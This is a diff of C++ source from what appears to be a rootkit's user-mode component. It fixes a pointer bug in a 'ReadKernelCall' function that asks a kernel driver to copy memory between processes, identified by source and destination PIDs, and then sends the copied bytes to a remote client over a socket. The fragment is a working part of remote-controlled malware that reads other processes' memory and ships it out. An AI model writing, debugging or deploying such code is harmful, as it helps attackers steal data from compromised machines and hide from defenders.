@@ -166,7 +166,7 @@ int DriverCalls::WriteKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* Ro
 }
 
 
-int DriverCalls::ReadKernelCall(SOCKET ClientToServerSocket, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
+int DriverCalls::ReadKernelCall(SOCKET ClientToServerSocket, PVOID* LocalRead, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
 	PASS_DATA SocketResult = { 0 };
 	ULONG64 SourceProcess = 0;
 	ULONG64 DestinationProcess = 0;
@@ -189,8 +189,8 @@ int DriverCalls::ReadKernelCall(SOCKET ClientToServerSocket, PVOID LocalRead, RO
 	RootkInst->MdlName = ModuleName;
 	GetSystemInfo(&LocalSysInfo);
 	AllocationSize = (SIZE_T)(((RootkInst->Size / LocalSysInfo.dwPageSize) + 1) * LocalSysInfo.dwPageSize);
-	LocalRead = malloc(AllocationSize);
-	if (LocalRead == NULL) {
+	*LocalRead = malloc(AllocationSize);
+	if (*LocalRead == NULL) {
 		UnexpectedError = memalloc;
 	}
 
@@ -204,7 +204,7 @@ int DriverCalls::ReadKernelCall(SOCKET ClientToServerSocket, PVOID LocalRead, RO
 			if (UnexpectedError == successful) {
 
 				// Call driver with parameters if successful so far:
-				RootkInst->Out = LocalRead;
+				RootkInst->Out = *LocalRead;
 				RootkInst->MainPID = SourceProcess;
 				RootkInst->SemiPID = DestinationProcess;
 				RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
@@ -222,7 +222,7 @@ int DriverCalls::ReadKernelCall(SOCKET ClientToServerSocket, PVOID LocalRead, RO
 
 	// Return the results of the operation to the client:
 	if (UnexpectedError == successful && DriverResult == 1) {
-		SocketResult = root_internet::SendData(ClientToServerSocket, LocalRead, (int)RootkInst->Size, FALSE, 0, MediumLog);
+		SocketResult = root_internet::SendData(ClientToServerSocket, *LocalRead, (int)RootkInst->Size, FALSE, 0, MediumLog);
 		if (SocketResult.err || SocketResult.value != (int)RootkInst->Size) {
 			return 0;
 		}
